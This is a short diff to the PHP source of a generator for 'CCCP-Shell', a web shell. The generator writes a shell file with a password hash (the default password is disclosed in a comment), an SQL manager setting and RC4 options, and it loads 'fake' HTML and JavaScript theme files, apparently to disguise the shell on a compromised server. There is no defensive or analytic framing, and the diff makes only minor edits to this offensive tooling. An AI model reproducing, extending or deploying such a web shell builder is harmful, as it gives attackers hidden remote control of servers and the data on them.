@@ -91,6 +91,7 @@ $genPlugins .= " else if (\$p['me'] === 'loader') {
 	sAjax(\$loader);
 }";	
 
+//$genPlugins = packer_strips($genPlugins);
 $themeJS = file_get_contents("{$baseFolder}/themes/{$theme}/fake-js.js");
 $themeJS = packer_pack_js($themeJS);
 $code = file_get_contents("{$baseFolder}/themes/{$theme}/fake.html");
@@ -115,7 +116,7 @@ $shell = "<?php
 \$config['SQLLimit'] = {$config['SQLLimit']};   //sql manager result limit.
 \$config['checkBDel'] = true;//Check Before Delete: true = On 
 \$config['consNames'] = array('post'=>'dsr', 'slogin'=>'cccpshell', 'sqlclog'=>'conlog'); //Constants names
-\$config['sPass'] = '{$sPass}'; // md5(pass) //cccpshell
+\$config['sPass'] = '{$sPass}'; // md5('cccpshell')
 \$config['rc4drop'] = {$rc4drop};  //drop size
 
 
@@ -137,3 +138,4 @@ if (isset(\$_SERVER['HTTP_X_REQUESTED_WITH']) && \$_SERVER['HTTP_X_REQUESTED_WIT
 
 //echo $shell;
 file_put_contents("{$baseFolder}/CCCP-Shell.php", $shell);
+echo 'Generation completed!';
